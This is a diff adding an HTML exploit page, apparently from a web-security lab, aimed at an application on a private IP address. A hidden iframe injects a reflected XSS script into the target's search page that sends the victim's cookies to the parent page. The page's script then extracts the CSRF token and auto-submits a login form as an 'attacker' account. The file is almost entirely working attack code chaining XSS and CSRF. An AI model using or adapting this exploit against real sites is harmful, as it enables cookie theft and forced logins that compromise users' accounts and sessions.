@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<!-- 
+  References: 
+    https://stackoverflow.com/questions/16266474/javascript-listen-for-postmessage-events-from-specific-iframe
+    https://stackoverflow.com/questions/17940811/example-of-silently-submitting-a-post-form-csrf
+    https://stackoverflow.com/questions/30067870/accessing-cookies-of-an-iframe-in-parent-window
+ -->
+<html>
+
+<head>
+    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+</head>
+
+<body>
+    <h1>Get youself Hacked !!!</h1>
+
+    <form id="myForm" action="http://172.27.16.3:33414/c011a736/login?csrfdefense=1&xssdefense=0" target="formDestination" method="post">
+        <input type="text" name="username" value="attacker">
+        <input type="text" name="password" value="97cedde9ff6c166b0bbc6100b24c810c">
+        <input type="text" name="csrf_token" value="">
+    </form>
+
+
+    <!-- Main iFrame -->
+    <iframe style="display:none" name="f2" id="f1" src="http://172.27.16.3:33414/c011a736/search?q=<script>parent.postMessage(document.cookie,'*')</script>"></iframe>
+
+
+    <script type="text/javascript">
+
+        //Event listeners
+        var event = window.addEventListener ? "addEventListener" : "attachEvent";
+        var eventWin = window[event];
+        var message = eventWin === "attachEvent" ? "onmessage" : "message";
+
+        // event handler for postMessage
+        eventWin(message, function (e) {
+            ind = e.data.indexOf("csrf_token=");
+            console.log(e.data);
+            // skip the size of token
+            token = e.data.substr(ind + 11, 32);
+            console.log ("The token is: " + token);
+            $('[name=csrf_token]').val(token);
+            document.forms[0].submit();
+        });
+    </script>
+</body>
+</html>
